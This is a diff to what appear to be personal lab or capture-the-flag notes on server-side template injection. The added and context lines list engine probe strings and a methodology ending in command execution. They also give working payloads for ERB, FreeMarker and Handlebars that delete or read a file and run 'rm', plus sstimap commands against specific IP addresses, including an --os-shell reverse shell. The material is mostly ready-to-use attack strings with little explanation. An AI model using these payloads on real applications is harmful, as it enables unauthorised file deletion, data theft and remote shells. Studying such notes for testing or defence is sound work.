@@ -3,6 +3,18 @@
 //* test
 // ${{<%[%'"}}%\
 // if this return an error it might be vulnerable
+//* All the payloads structure
+// {7*7}
+// ${7*7}
+// {{7*7}}
+// <%7*7%>
+// [%7*7%]
+// #{7*7}
+//* Methodology
+// 0 => understand the template engine
+// 1 => find self object
+// 2 => search for useful methods
+// 3 => execute commands
 //* ERB
 // <%= File.delete("morale.txt") %>
 // <%= File.read("morale.txt") %>
@@ -13,6 +25,7 @@
 //* freemarker
 // ${"freemarker.template.utility.Execute"?new()("rm  morale.txt")}
 //* handlebars
+// #{6*6}
 // wrtz{{#with "s" as |string|}}
 //   {{#with "e"}}
 //       {{#with split as |conslist|}}
@@ -29,7 +42,8 @@
 //                  {{/with}}
 //               {{/each}}
 //          {{/with}}
-//       {{/with}}//  {{/with}}
+//       {{/with}}
+// //  {{/with}}
 // {{/with}}
 //* django template engine
 // {% debug %}
@@ -84,4 +98,9 @@
 // python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
 //* reverse shell
 // python3 sstimap.py -u http://83.136.253.59:50288/index.php?name=test --os-shell
+
+
+
+
+
 
